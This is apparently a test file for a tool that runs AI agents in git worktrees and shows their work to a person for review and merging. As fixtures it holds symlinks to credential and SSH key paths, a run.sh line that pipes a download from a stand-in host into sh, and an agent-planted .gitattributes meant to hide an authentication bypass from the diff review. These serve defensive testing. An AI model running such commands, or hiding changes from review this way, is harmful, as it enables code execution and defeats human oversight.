  assert.deepEqual(await tidy({ copied }), { removed: false, kept: true });
  git(t.ws, 'checkout', '--', 'a.txt');
  // A package added inside the copied node_modules is part of the copy: with only copies left, the folder goes.
  write(path.join(t.ws, 'node_modules/added/index.js'), 'y\n');
  const branch = git(t.ws, 'branch', '--show-current');
  assert.deepEqual(await tidy({ copied }), { removed: true, branch });
  assert.equal(fs.existsSync(t.ws), false);
  assert.equal(git(t.root, 'branch', '--list', branch), '');
});

test('a workspace that cannot be finished after git made it is taken away again, with its branch', async () => {
  const realpath = fs.realpathSync.native;
  let calls = 0;
  fs.realpathSync.native = (p, ...rest) => {
    if (String(p).includes('broken-aa0009') && ++calls === 1) throw Object.assign(new Error('EIO: i/o error'), { code: 'EIO' });
    return realpath(p, ...rest);
  };
  try {
    await assert.rejects(createWorkspace({ repoRoot: repo, agentId: 'aa0009', slug: 'broken', baseDir }), /could not make a workspace/);
  } finally {
    fs.realpathSync.native = realpath;
  }
  assert.equal(fs.existsSync(path.join(workspacesFolder(repo, baseDir), 'broken-aa0009')), false);
  assert.equal(git(repo, 'branch', '--list', 'workbench/broken-aa0009'), '');
  assert.ok(!git(repo, 'worktree', 'list', '--porcelain').includes('broken-aa0009'));
});

test('when git stops part-way through making a workspace, its new branch and folder go too; a branch already there stays', async () => {
  const r = path.join(T, 'repo-stops');
  fs.mkdirSync(r);
  git(r, 'init', '-q', '-b', 'main');
  write(path.join(r, 'a.txt'), 'a\n');
  git(r, 'add', '-A');
  git(r, 'commit', '-q', '-m', 'first');
  const folder = workspacesFolder(r, baseDir);
  // git makes the branch first, then the folder: with .git/worktrees in the way it stops in between, as after a Ctrl-C.
  fs.writeFileSync(path.join(r, '.git', 'worktrees'), '');
  await assert.rejects(createWorkspace({ repoRoot: r, agentId: 'bb0001', slug: 'stops', baseDir }), /could not make a workspace/);
  fs.rmSync(path.join(r, '.git', 'worktrees'));
  assert.equal(git(r, 'branch', '--list', 'workbench/*'), '');
  // A post-checkout hook that fails: git finished the folder, then reported an error.
  const hook = path.join(r, '.git', 'hooks', 'post-checkout');
  write(hook, '#!/bin/sh\nexit 1\n');
  fs.chmodSync(hook, 0o755);
  await assert.rejects(createWorkspace({ repoRoot: r, agentId: 'bb0002', slug: 'stops', baseDir }), /could not make a workspace/);
  fs.rmSync(hook);
  assert.equal(git(r, 'branch', '--list', 'workbench/*'), '');
  assert.equal(fs.existsSync(path.join(folder, 'stops-bb0002')), false);
  assert.ok(!git(r, 'worktree', 'list', '--porcelain').includes('stops-bb0002'));
  // A branch of that name from before (another session's kept work, say) is left exactly as it was.
  git(r, 'branch', 'workbench/stops-bb0003');
  const was = git(r, 'rev-parse', 'workbench/stops-bb0003');
  await assert.rejects(createWorkspace({ repoRoot: r, agentId: 'bb0003', slug: 'stops', baseDir }), /could not make a workspace/);
  assert.equal(git(r, 'rev-parse', 'workbench/stops-bb0003'), was);
});

// ---------------------------------------------------------------------------------------------
// Source control: snapshotWork, workDiff, mergeWork, discardWork, gitGraph, gitIdentity.

// How many of the tests that share nothing run at once, and how many refusal cases within one test.
const TESTS_AT_ONCE = 4;
const CASES_AT_ONCE = 6;

/** The person's identity, in each test repository's own config. The environment says someone else, on purpose. */
const PERSON = { name: 'Pat Person', email: 'pat@example.invalid' };
const STARTING_FILES = { 'a.txt': 'one\ntwo\nthree\n', 'b.txt': 'b\n', 'c.txt': 'c\n', '.gitignore': '.env\nnode_modules/\n' };

/** git that may fail: { code, out, err }. */
const gitTry = (cwd, ...args) => {
  const r = spawnSync('git', args, { cwd, encoding: 'utf8' });
  return { code: r.status, out: r.stdout, err: r.stderr };
};
/** git without blocking, so that several cases can run at once: its output, trimmed. */
const gitAsync = (cwd, args, env = process.env) => new Promise((resolve, reject) => {
  execFile('git', args, { cwd, encoding: 'utf8', env }, (err, out) => (err ? reject(err) : resolve(out.trim())));
});
/** git status as it is, without git writing its index on the way (GIT_OPTIONAL_LOCKS=0). */
const STATUS = ['status', '--porcelain=v1', '--untracked-files=all'];
const statusOf = cwd => execFileSync('git', STATUS, { cwd, encoding: 'utf8', env: { ...process.env, GIT_OPTIONAL_LOCKS: '0' } });
const headOf = cwd => git(cwd, 'rev-parse', 'HEAD');
const messageOf = (cwd, id) => {
  const raw = execFileSync('git', ['cat-file', 'commit', id], { cwd, encoding: 'utf8' });
  return raw.slice(raw.indexOf('\n\n') + 2);
};
const sha = buf => crypto.createHash('sha256').update(buf).digest('hex');

/** Every file under `dir` except its .git: path -> sha256 of its bytes, or a link's target. */
function folderPrint(dir) {
  const out = {};
  const walk = rel => {
    for (const e of fs.readdirSync(path.join(dir, rel), { withFileTypes: true })) {
      const r = rel ? `${rel}/${e.name}` : e.name;
      if (r === '.git') continue;
      const full = path.join(dir, r);
      if (e.isSymbolicLink()) out[r] = `link:${fs.readlinkSync(full)}`;
      else if (e.isDirectory()) walk(r);
      else out[r] = sha(fs.readFileSync(full));
    }
  };
  walk('');
  return out;
}

/** The agent's git index (its bytes and its entries), its status and HEAD. */
async function indexState(ws) {
  const [index, entries, status, head] = await Promise.all([
    gitAsync(ws, ['rev-parse', '--git-path', 'index']), gitAsync(ws, ['ls-files', '-s']),
    gitAsync(ws, STATUS, { ...process.env, GIT_OPTIONAL_LOCKS: '0' }), gitAsync(ws, ['rev-parse', 'HEAD']),
  ]);
  return { bytes: sha(fs.readFileSync(path.resolve(ws, index))), entries, status, head };
}

/** A repository on main holding `files` in one commit, made once and copied for each test: git starts are slow. */
const templates = new Map();
function template(files, identity) {
  const key = JSON.stringify([files, identity]);
  if (!templates.has(key)) {
    const r = path.join(T, `template-${templates.size + 1}`);
    fs.mkdirSync(r);
    git(r, 'init', '-q', '-b', 'main');
    if (identity) {
      git(r, 'config', 'user.name', PERSON.name);
      git(r, 'config', 'user.email', PERSON.email);
    }
    for (const [f, text] of Object.entries(files)) write(path.join(r, f), text);
    git(r, 'add', '-A');
    git(r, 'commit', '-q', '-m', 'first');
    templates.set(key, r);
  }
  return templates.get(key);
}

/** A repository on main with `files`, the person's identity in its own config (unless `identity: false`), and one agent's folder. */
let sourceRepos = 0;
async function agentRepo(files = STARTING_FILES, { identity = true, slug = 'Search cleanup' } = {}) {
  const n = ++sourceRepos;
  const r = path.join(T, `source-${n}`);
  fs.cpSync(template(files, identity), r, { recursive: true });
  const root = fs.realpathSync.native(r);
  const id = `sc${String(n).padStart(4, '0')}`;
  const ws = await createWorkspace({ repoRoot: root, agentId: id, slug, baseDir });
  return { root, ws, id, w: f => path.join(ws.path, f), p: f => path.join(root, f) };
}

/** What a merge card is drawn from: the snapshot, and the person's branch and HEAD. */
async function proposal(t, since = t.ws.base) {
  const s = await snapshotWork({ repoRoot: t.root, path: t.ws.path, since });
  const info = await prepareRepo(t.root);
  return { s, expect: { workId: s.workId, into: info.branch, intoHead: info.head } };
}

const mergeOpts = (t, expect, since = t.ws.base, more = {}) => ({
  repoRoot: t.root, path: t.ws.path, branch: t.ws.branch, since, expect,
  message: { subject: 'Fix the search box', body: 'It trims spaces now.' }, agentId: t.id, harness: 'claude', name: 'Search cleanup', ...more,
});

/** Everything a refused merge must leave alone. */
async function everything(t) {
  const there = fs.existsSync(t.ws.path);
  const [head, on, personStatus, refs, stash, agent] = await Promise.all([
    gitAsync(t.root, ['rev-parse', 'HEAD']), gitAsync(t.root, ['rev-parse', '--symbolic-full-name', 'HEAD']),
    gitAsync(t.root, STATUS, { ...process.env, GIT_OPTIONAL_LOCKS: '0' }), gitAsync(t.root, ['for-each-ref']),
    gitAsync(t.root, ['stash', 'list']), there ? indexState(t.ws.path) : null,
  ]);
  return { person: folderPrint(t.root), head, on, personStatus, refs, stash, agent, agentFiles: there ? folderPrint(t.ws.path) : null };
}

/** Run `tasks` (functions that return promises), a few at a time; the first failure is thrown once all are done. */
async function inParallel(tasks, limit = CASES_AT_ONCE) {
  let next = 0;
  const errors = [];
  await Promise.all(Array.from({ length: Math.min(limit, tasks.length) }, async () => {
    while (next < tasks.length) {
      const task = tasks[next++];
      try {
        await task();
      } catch (e) {
        errors.push(e);
      }
    }
  }));
  if (errors.length) throw errors[0];
}

/** A plain clone, for showing what plain git would do without touching the test's repository. */
let clones = 0;
function cloneOf(root) {
  const dest = path.join(T, `clone-${++clones}`);
  git(T, 'clone', '-q', root, dest);
  return dest;
}

const HOOKS = ['pre-commit', 'prepare-commit-msg', 'commit-msg', 'post-commit', 'pre-merge-commit', 'post-merge', 'post-checkout',
  'post-rewrite', 'reference-transaction', 'post-index-change', 'pre-auto-gc', 'pre-push'];

/** Hooks that note that they ran in `log`. The pre-commit one also says no. */
function plantHooks(gitDir, log) {
  for (const h of HOOKS) {
    const f = path.join(gitDir, 'hooks', h);
    write(f, `#!/bin/sh\necho ${h} >> '${log}'\n${h === 'pre-commit' ? 'exit 1\n' : ''}`);
    fs.chmodSync(f, 0o755);
  }
}
/**
 * The same hooks set in git config instead (git 2.54 and newer run these), one per event, under names holding a dot and
 * an "=", written into `configFile`. They note `<prefix>-<event>`.
 */
function plantConfigHooks(configFile, log, prefix = 'config') {
  fs.appendFileSync(configFile, HOOKS.map(h => `[hook "${prefix}.${h}=x"]\n\tcommand = echo ${prefix}-${h} >> '${log}'${h === 'pre-commit' ? '; exit 1' : ''}\n\tevent = ${h}\n`).join(''));
}
/** The hooks that noted themselves in `log`, in order (without the arguments git gives a hook set in config). */
const ranHooks = log => (fs.existsSync(log) ? fs.readFileSync(log, 'utf8').split('\n').filter(Boolean).map(l => l.split(' ')[0]) : []);

// These share nothing (each has repositories of its own, and none changes process.env), so they run a few at a time.
describe('source control', { concurrency: TESTS_AT_ONCE }, () => {
  test('snapshotWork reads the work set in a temporary index and never writes the agent’s own; workDiff shows the same files', async () => {
    const t = await agentRepo({ ...STARTING_FILES, 'src/x.js': 'x\n' });
    const { w } = t;
    write(w('d.txt'), 'd\n');
    git(t.ws.path, 'add', 'd.txt');
    git(t.ws.path, 'commit', '-q', '-m', 'agent commit'); // committed
    write(w('a.txt'), 'one\nTWO\nthree\nfour\n'); // an edit, not staged: +2 -1
    write(w('staged.txt'), 's1\ns2\n');
    git(t.ws.path, 'add', 'staged.txt'); // a new file, staged
    fs.rmSync(w('b.txt')); // deleted, not staged
    git(t.ws.path, 'rm', '-q', 'c.txt'); // deleted, staged
    write(w('new.txt'), 'n\n'); // new, not staged
    const outside = path.join(T, 'outside-secret.txt');
    write(outside, 'SECRET OUTSIDE THE FOLDER\n');
    fs.symlinkSync(outside, w('out-link')); // a link out of the folder
    write(w('.gitignore'), '.env\nnode_modules/\nsecret/\n'); // the agent hides a folder of its own...
    write(w('secret/key.pem'), 'KEY\n'); // ...and this file in it
    write(w('node_modules/p/i.js'), 'x\n'); // hidden from the start: not the agent's doing, not named
    write(w('.env'), 'TOKEN=agent\n'); // hidden from the start too
    write(w('nest/z.txt'), 'z\n');
    git(w('nest'), 'init', '-q'); // a repository inside, with no commit yet: `git add -A` fails on it
    write(w('nest2/y.txt'), 'y\n');
    git(w('nest2'), 'init', '-q');
    git(w('nest2'), 'add', '-A');
    git(w('nest2'), 'commit', '-q', '-m', 'nested'); // and one with a commit
    const head = headOf(t.ws.path);
    const before = await indexState(t.ws.path);

    const s = await snapshotWork({ repoRoot: t.root, path: t.ws.path, since: t.ws.base });
    assert.deepEqual(await indexState(t.ws.path), before, 'the agent’s index, status and HEAD are as they were');
    assert.equal(s.head, head);
    assert.equal(s.since, t.ws.base);
    assert.match(s.tree, /^[0-9a-f]{40}$/);
    // The work, then the review: the person's HEAD (where the agent started, so the merge makes the work's own tree).
    assert.equal(s.workId, `${head}:${s.tree}:${t.ws.base}:${s.tree}`);
    assert.equal(s.changed, true);
    assert.deepEqual(s.files, [
      { path: '.gitignore', status: 'modified', adds: 1, dels: 0 },
      { path: 'a.txt', status: 'modified', adds: 2, dels: 1 },
      { path: 'b.txt', status: 'deleted', adds: 0, dels: 1 },
      { path: 'c.txt', status: 'deleted', adds: 0, dels: 1 },
      { path: 'd.txt', status: 'added', adds: 1, dels: 0 },
      { path: 'new.txt', status: 'added', adds: 1, dels: 0 },
      { path: 'out-link', status: 'added', adds: 1, dels: 0 },
      { path: 'staged.txt', status: 'added', adds: 2, dels: 0 },
    ]);
    assert.deepEqual(s.left, [
      { path: 'nest/', why: 'nested-repo' },
      { path: 'nest2/', why: 'nested-repo' },
      { path: 'secret/key.pem', why: 'ignored' },
    ]);
    // The link is kept as a link: its blob is the path it points to, never the file there.
    assert.match(git(t.root, 'ls-tree', s.tree, '--', 'out-link'), /^120000 blob /);
    assert.equal(git(t.root, 'cat-file', 'blob', `${s.tree}:out-link`), outside);
    // The receipt names the same files: the work set plus what is left out.
    const stats = await diffStats({ path: t.ws.path, base: t.ws.base });
    assert.deepEqual(stats.list.map(f => f.path).sort(), [...s.files, ...s.left].map(f => f.path).sort());
    // The same work gives the same tree; any change gives another.
    assert.equal((await snapshotWork({ repoRoot: t.root, path: t.ws.path, since: t.ws.base })).workId, s.workId);
    write(w('new.txt'), 'n2\n');
    assert.notEqual((await snapshotWork({ repoRoot: t.root, path: t.ws.path, since: t.ws.base })).tree, s.tree);
    write(w('new.txt'), 'n\n');

    const d = await workDiff({ repoRoot: t.root, path: t.ws.path, since: t.ws.base });
    assert.deepEqual(await indexState(t.ws.path), before);
    assert.equal(d.workId, s.workId);
    assert.equal(d.head, head);
    assert.equal(d.since, t.ws.base);
    assert.equal(d.omitted, 0);
    assert.equal(d.cut, undefined);
    assert.deepEqual(d.left, s.left);
    assert.deepEqual(d.files.map(({ patch, ...f }) => f), s.files);
    const patch = p => d.files.find(f => f.path === p).patch;
    assert.match(patch('a.txt'), /^diff --git a\/a\.txt b\/a\.txt\nindex [0-9a-f]+\.\.[0-9a-f]+ 100644\n--- a\/a\.txt\n\+\+\+ b\/a\.txt\n@@ /);
    assert.ok(patch('a.txt').endsWith(' one\n-two\n+TWO\n three\n+four\n'));
    assert.match(patch('b.txt'), /^diff --git a\/b\.txt b\/b\.txt\ndeleted file mode 100644\n[\s\S]*\n-b\n$/);
    assert.match(patch('out-link'), /\nnew file mode 120000\n/);
    assert.ok(patch('out-link').endsWith(`+${outside}\n\\ No newline at end of file\n`));
    assert.ok(d.files.every(f => !String(f.patch).includes('SECRET OUTSIDE')), 'nothing from outside the folder');
  });

  test('a save’s sibling is Workbench’s, not the agent’s: the work set and the receipt leave it out, by the file view’s own rule', async () => {
    const t = await agentRepo();
    const { w } = t;
    write(w('a.txt'), 'one\nTWO\nthree\n');
    // The names stage 1 pinned for isSaveFile, written beside the agent's files: a save cut short leaves one.
    const yes = ['.a.txt.workbench-save-0123456789abcdef', 'src/.b.js.workbench-save-00112233445566ff', '.x.workbench-save-ffffffffffffffff'];
    const no = ['a.txt.workbench-save-0123456789abcdef', '.a.txt.workbench-save-0123', '.c.txt.workbench-save-0123456789ABCDEF',
      '.workbench-save-0123456789abcdef', '.d.workbench-save-0123456789abcdef/inner.txt', '.e.txt.workbench-save-0123456789abcdef.bak'];
    for (const rel of [...yes, ...no]) write(w(rel), 'half of the person’s text\n');
    for (const rel of yes) assert.equal(fileViewSaveFile(rel) && isSaveFile(rel), true, rel);
    for (const rel of no) assert.equal(fileViewSaveFile(rel) || isSaveFile(rel), false, rel);
    const s = await snapshotWork({ repoRoot: t.root, path: t.ws.path, since: t.ws.base });
    const kept = ['a.txt', ...no].sort();
    assert.deepEqual(s.files.map(f => f.path), kept);
    assert.deepEqual(s.left, [], 'left out without a word: they are not the agent’s');
    for (const rel of yes) assert.equal(git(t.root, 'ls-tree', '-r', '--name-only', s.tree, '--', rel), '', rel);
    const stats = await diffStats({ path: t.ws.path, base: t.ws.base });
    assert.deepEqual(stats.list.map(f => f.path), kept, 'the receipt names the same files');
  });

  test('workDiff marks binary and large files, and cuts long patches and long lists', async () => {
    const t = await agentRepo({ 'README.md': '#\n' });
    const { w } = t;
    write(w('big.txt'), 'x\n'.repeat(1_100_000)); // 2.2 MB: too large to show
    write(w('bin.dat'), Buffer.from([0, 1, 2, 0, 255]));
    write(w('crlf.txt'), 'one\r\ntwo\r\n');
    write(w('long.txt'), Array.from({ length: 3000 }, (_, i) => `line ${i}`).join('\n') + '\n');
    for (let i = 0; i < 6; i++) write(w(`many/f${i}.txt`), `${i}\n`);

    const all = await workDiff({ repoRoot: t.root, path: t.ws.path, since: t.ws.base });
    assert.deepEqual(all.files.map(f => f.path), ['big.txt', 'bin.dat', 'crlf.txt', 'long.txt', ...[0, 1, 2, 3, 4, 5].map(i => `many/f${i}.txt`)]);
    const by = (d, p) => d.files.find(f => f.path === p);
    assert.deepEqual(by(all, 'big.txt'), { path: 'big.txt', status: 'added', adds: 0, dels: 0, large: true, patch: null });
    assert.deepEqual(by(all, 'bin.dat'), { path: 'bin.dat', status: 'added', adds: 0, dels: 0, binary: true, patch: null });
    assert.ok(by(all, 'crlf.txt').patch.endsWith('+one\r\n+two\r\n'), 'carriage returns are kept for the page to show');
    assert.equal(by(all, 'long.txt').adds, 3000);
    assert.equal(by(all, 'long.txt').cut, undefined);
    assert.equal(all.cut, undefined);
    assert.equal(all.omitted, 0);
    // The snapshot counts the same files.
    const s = await snapshotWork({ repoRoot: t.root, path: t.ws.path, since: t.ws.base });
    assert.deepEqual(all.files.map(({ patch, ...f }) => f), s.files);

    const small = await workDiff({ repoRoot: t.root, path: t.ws.path, since: t.ws.base, maxFiles: 5, maxFileBytes: 2000, maxTotalBytes: 1500 });
    assert.equal(small.files.length, 5);
    assert.equal(small.omitted, 5);
    assert.equal(small.cut, true);
    assert.equal(by(small, 'big.txt').patch, null);
    assert.equal(by(small, 'big.txt').cut, undefined);
    assert.equal(by(small, 'crlf.txt').cut, undefined);
    const long = by(small, 'long.txt');
    assert.equal(long.cut, true);
    assert.match(long.patch, /^diff --git a\/long\.txt b\/long\.txt\n/);
    assert.ok(long.patch.endsWith('\n'), 'cut at the end of a line');
    assert.deepEqual(by(small, 'many/f0.txt'), { path: 'many/f0.txt', status: 'added', adds: 1, dels: 0, patch: null, cut: true });
    const total = small.files.reduce((n, f) => n + Buffer.byteLength(f.patch || ''), 0);
    assert.ok(total <= 1500 && total > 1000, `${total} bytes in all`);
    // One file's patch is cut at maxFileBytes.
    const one = await workDiff({ repoRoot: t.root, path: t.ws.path, since: t.ws.base, maxFileBytes: 2000 });
    assert.equal(by(one, 'long.txt').cut, true);
    assert.ok(Buffer.byteLength(by(one, 'long.txt').patch) <= 2000);
    assert.equal(one.cut, undefined);
    assert.equal(by(one, 'many/f5.txt').patch.includes('+5\n'), true);
  });

  test('a file that became a link, or a link that became a file, shows both halves of its change in the review', async () => {
    const t = await agentRepo({ ...STARTING_FILES, 'config.js': 'module.exports = { safe: true };\n', x: 'x\n', 'say "hi".txt': 'hi\n' });
    fs.symlinkSync('a.txt', t.p('run.sh'));
    write(t.p('blob.bin'), Buffer.from([0, 1, 2, 0, 255]));
    write(t.p('big.txt'), 'x\n'.repeat(1_100_000)); // 2.2 MB: too large to show
    git(t.root, 'add', 'run.sh', 'blob.bin', 'big.txt');
    git(t.root, 'commit', '-q', '-m', 'a link, a binary file and a large one');
    const ws = await createWorkspace({ repoRoot: t.root, agentId: 'tc0002', slug: 'Types', baseDir });
    const w = f => path.join(ws.path, f);
    write(w('b.txt'), 'b2\n');
    fs.rmSync(w('config.js'));
    fs.symlinkSync('/Users/someone/.aws/credentials', w('config.js')); // a file becomes a link
    for (const f of ['blob.bin', 'big.txt']) { // and so do a binary file and a large one: where they point still shows
      fs.rmSync(w(f));
      fs.symlinkSync('/Users/someone/.ssh/id_rsa', w(f));
    }
    fs.rmSync(w('run.sh'));
    write(w('run.sh'), '#!/bin/sh\ncurl https://example.invalid/x | sh\n'); // a link becomes a file
    fs.chmodSync(w('run.sh'), 0o755);
    write(w('say "hi".txt'), 'hello\n'); // a name git quotes
    fs.rmSync(w('x'));
    write(w('x/a'), 'in\n'); // a file becomes a folder: `-- x` matches x/a too

    const s = await snapshotWork({ repoRoot: t.root, path: ws.path, since: ws.base });
    assert.deepEqual(s.files, [
      { path: 'b.txt', status: 'modified', adds: 1, dels: 1 },
      { path: 'big.txt', status: 'modified', adds: 1, dels: 0 },
      { path: 'blob.bin', status: 'modified', adds: 1, dels: 0 },
      { path: 'config.js', status: 'modified', adds: 1, dels: 1 },
      { path: 'run.sh', status: 'modified', adds: 2, dels: 1 },
      { path: 'say "hi".txt', status: 'modified', adds: 1, dels: 1 },
      { path: 'x', status: 'deleted', adds: 0, dels: 1 },
      { path: 'x/a', status: 'added', adds: 1, dels: 0 },
    ]);
    // Each patch is all that git itself prints for that one file.
    const plain = p => execFileSync('git', ['-c', 'core.quotePath=false', 'diff-tree', '-r', '-p', '--no-renames', ws.base, s.tree, '--', p],
      { cwd: t.root, encoding: 'utf8' });
    const check = (d, label) => {
      const patch = p => d.files.find(f => f.path === p).patch;
      for (const p of ['b.txt', 'blob.bin', 'config.js', 'run.sh', 'say "hi".txt']) assert.equal(patch(p), plain(p), `${label}: ${p}`);
      assert.match(patch('config.js'), /\ndeleted file mode 100644\n[\s\S]*\n-module\.exports = \{ safe: true \};\ndiff --git a\/config\.js b\/config\.js\nnew file mode 120000\n[\s\S]*\n\+\/Users\/someone\/\.aws\/credentials\n/);
      for (const p of ['blob.bin', 'big.txt']) {
        assert.match(patch(p), new RegExp(`^diff --git a/${p} b/${p}\\ndeleted file mode 100644\\nindex [0-9a-f]+\\.\\.0+\\nBinary files a/${p} and /dev/null differ\\n` +
          `diff --git a/${p} b/${p}\\nnew file mode 120000\\n[\\s\\S]*\\n\\+/Users/someone/\\.ssh/id_rsa\\n`), `${label}: ${p}`);
      }
      assert.match(patch('run.sh'), /\ndeleted file mode 120000\n[\s\S]*\n-a\.txt\n[\s\S]*\nnew file mode 100755\n[\s\S]*\n\+#!\/bin\/sh\n\+curl https:\/\/example\.invalid\/x \| sh\n$/);
      assert.match(patch('say "hi".txt'), /^diff --git "a\/say \\"hi\\"\.txt" "b\/say \\"hi\\"\.txt"\n/);
      assert.match(patch('x'), /^diff --git a\/x b\/x\ndeleted file mode 100644\n[\s\S]*\n-x\n$/);
    };
    // Asked for together...
    const all = await workDiff({ repoRoot: t.root, path: ws.path, since: ws.base });
    check(all, 'together');
    assert.equal(all.files.find(f => f.path === 'x/a').patch, plain('x/a'));
    // ...and one by one, when the answer does not line up (x/a is past maxFiles, but `-- x` brings it in).
    const fewer = await workDiff({ repoRoot: t.root, path: ws.path, since: ws.base, maxFiles: 7 });
    assert.equal(fewer.omitted, 1);
    check(fewer, 'one by one');
  });

  test('the commit the review makes of work not committed yet is dated as its parent, never older, and is the same each time', async () => {
    // git looks for where two histories met newest first: a commit dated before its own parent would have it walk all of
    // the person's history for every card and diff.
    const t = await agentRepo();
    write(t.w('a.txt'), 'one\nAGENT\nthree\n');
    const s = await snapshotWork({ repoRoot: t.root, path: t.ws.path, since: t.ws.base });
    // Nothing points at it: it is found by its tree and its parent, the agent's HEAD.
    const made = () => git(t.root, 'cat-file', '--batch-all-objects', '--batch-check=%(objectname) %(objecttype)').split('\n')
      .filter(l => l.endsWith(' commit')).map(l => l.split(' ')[0])
      .filter(id => git(t.root, 'log', '-1', '--format=%T %P', id) === `${s.tree} ${s.head}`);
    const found = made();
    assert.equal(found.length, 1);
    const dates = id => git(t.root, 'log', '-1', '--format=%at %ct', id);
    const parent = git(t.root, 'log', '-1', '--format=%ct', s.head);
    assert.equal(dates(found[0]), `${parent} ${parent}`);
    await snapshotWork({ repoRoot: t.root, path: t.ws.path, since: t.ws.base });
    await workDiff({ repoRoot: t.root, path: t.ws.path, since: t.ws.base });
    assert.deepEqual(made(), found, 'the same commit each time');
  });

  test('file names that are not UTF-8 each keep their own counts, and get no patch: never another file’s', async () => {
    const t = await agentRepo();
    const blob = text => execFileSync('git', ['hash-object', '-w', '--stdin'], { cwd: t.ws.path, input: text, encoding: 'utf8' }).trim();
    const latin1 = byte => Buffer.concat([Buffer.from('caf'), Buffer.from([byte]), Buffer.from('.txt')]);
    // Two Latin-1 names. This disk may refuse them as files, so they are in the agent's index only, marked skip-worktree
    // so that `add -A` leaves them in its work; on Linux they would be ordinary files.
    const entries = [[latin1(0xe9), blob('line\n'.repeat(40))], [latin1(0xe8), blob('just one\n')]];
    execFileSync('git', ['update-index', '--add', '--index-info'], { cwd: t.ws.path,
      input: Buffer.concat(entries.map(([name, id]) => Buffer.concat([Buffer.from(`100644 ${id}\t`), name, Buffer.from('\n')]))) });
    execFileSync('git', ['update-index', '--skip-worktree', '-z', '--stdin'], { cwd: t.ws.path,
      input: Buffer.concat(entries.flatMap(([name]) => [name, Buffer.from([0])])) });
    // And a real file whose UTF-8 name holds U+FFFD, the character both of those read as.
    const read = 'caf�.txt';
    write(t.w(read), 'a\nb\nc\n');
    const s = await snapshotWork({ repoRoot: t.root, path: t.ws.path, since: t.ws.base });
    assert.deepEqual(s.files, [ // in git's order, by bytes: e8, e9, then ef bf bd
      { path: read, status: 'added', adds: 1, dels: 0 },
      { path: read, status: 'added', adds: 40, dels: 0 },
      { path: read, status: 'added', adds: 3, dels: 0 },
    ]);
    const d = await workDiff({ repoRoot: t.root, path: t.ws.path, since: t.ws.base });
    assert.deepEqual(d.files.map(({ patch, ...f }) => f), s.files);
    assert.deepEqual(d.files.map(f => f.patch), [null, null, d.files[2].patch]);
    assert.ok(d.files[2].patch.endsWith('\n+a\n+b\n+c\n'), d.files[2].patch);
  });

  test('a .gitattributes of the agent’s own cannot make a text change look binary in the review, hidden or only in its index', async () => {
    const files = { ...STARTING_FILES, 'auth.js': 'function ok(u) { return check(u); }\n' };
    const shown = async (t, left) => {
      const s = await snapshotWork({ repoRoot: t.root, path: t.ws.path, since: t.ws.base });
      const d = await workDiff({ repoRoot: t.root, path: t.ws.path, since: t.ws.base });
      const auth = d.files.find(f => f.path === 'auth.js');
      assert.deepEqual(s.files.find(f => f.path === 'auth.js'), { path: 'auth.js', status: 'modified', adds: 1, dels: 1 });
      assert.ok(auth.patch.endsWith('-function ok(u) { return check(u); }\n+function ok(u) { return true; }\n'), auth.patch);
      assert.deepEqual(d.left, left);
    };

    // A .gitattributes that says JavaScript is not to be diffed, hidden by the agent's own .gitignore.
    const t = await agentRepo(files);
    write(t.w('.gitattributes'), '*.js -diff\n');
    write(t.w('.gitignore'), `${STARTING_FILES['.gitignore']}.gitattributes\n`);
    write(t.w('auth.js'), 'function ok(u) { return true; }\n');
    // The danger is real: in the agent's folder git takes the change for a binary one, and shows nothing of it.
    assert.equal(git(t.ws.path, 'diff', '--numstat', t.ws.base, '--', 'auth.js'), '-\t-\tauth.js');
    await shown(t, [{ path: '.gitattributes', why: 'ignored' }]);

    // The same, staged in the agent's own index and then deleted from its folder: git still reads it there.
    const u = await agentRepo(files);
    write(u.w('.gitattributes'), '*.js -diff\n');
    git(u.ws.path, 'add', '.gitattributes');
    fs.rmSync(u.w('.gitattributes'));
    write(u.w('auth.js'), 'function ok(u) { return true; }\n');
    assert.equal(git(u.ws.path, 'check-attr', 'diff', '--', 'auth.js'), 'auth.js: diff: unset');
    await shown(u, []);
  });

  test('mergeWork commits the work on the agent’s branch and joins it into the person’s branch with a merge commit', async () => {
    const t = await agentRepo();
    const { w, p } = t;
    write(w('a.txt'), 'one\nTWO\nthree\n');
    write(w('new.txt'), 'new\n');
    fs.rmSync(w('b.txt'));
    // The person moved on meanwhile, and has changes of their own that the merge does not touch.
    write(p('c.txt'), 'c2\n');
    git(t.root, 'commit', '-q', '-am', 'person');
    const p1 = headOf(t.root);
    write(p('c.txt'), 'c3, not committed\n');
    write(p('mine.txt'), 'mine\n');
    write(p('.env'), 'SECRET=person\n');
    const agentFiles = folderPrint(t.ws.path);

    const { s, expect } = await proposal(t);
    assert.deepEqual(expect, { workId: s.workId, into: 'main', intoHead: p1 });
    const r = await mergeWork(mergeOpts(t, expect));
    assert.deepEqual(r, { ok: true, into: 'main', merge: r.merge, work: r.work, files: 3, adds: 2, dels: 2 });
    assert.match(r.merge, /^[0-9a-f]{40}$/);
    // M has two parents, the person's HEAD then W; W holds exactly the work, on top of the agent's HEAD.
    assert.equal(git(t.root, 'log', '-1', '--format=%P', r.merge), `${p1} ${r.work}`);
    assert.equal(git(t.root, 'log', '-1', '--format=%P', r.work), t.ws.base);
    assert.equal(git(t.root, 'rev-parse', `${r.work}^{tree}`), s.tree);
    // The person's branch and folder are at M.
    assert.equal(headOf(t.root), r.merge);
    assert.equal(git(t.root, 'symbolic-ref', 'HEAD'), 'refs/heads/main');
    assert.equal(fs.readFileSync(p('a.txt'), 'utf8'), 'one\nTWO\nthree\n');
    assert.equal(fs.readFileSync(p('new.txt'), 'utf8'), 'new\n');
    assert.equal(fs.existsSync(p('b.txt')), false);
    // Their own changes are byte for byte what they were.
    assert.equal(fs.readFileSync(p('c.txt'), 'utf8'), 'c3, not committed\n');
    assert.equal(fs.readFileSync(p('mine.txt'), 'utf8'), 'mine\n');
    assert.equal(fs.readFileSync(p('.env'), 'utf8'), 'SECRET=person\n');
    assert.equal(statusOf(t.root), ' M c.txt\n?? mine.txt\n');
    // The danger avoided: moving a checked-out branch with update-ref leaves its folder behind, as a staged undo of the merge.
    const demo = cloneOf(t.root);
    git(demo, 'reset', '-q', '--hard', p1);
    git(demo, 'update-ref', 'refs/heads/main', r.merge);
    assert.equal(statusOf(demo), 'M  a.txt\nA  b.txt\nD  new.txt\n');
    // The messages, and who made them: the person's configured identity, not the environment's.
    assert.equal(messageOf(t.root, r.work),
      'Fix the search box\n\nIt trims spaces now.\n\nWorkbench-Agent: sc0003\nWorkbench-Kind: work\nCo-authored-by: Claude <noreply@anthropic.com>\n'.replace('sc0003', t.id));
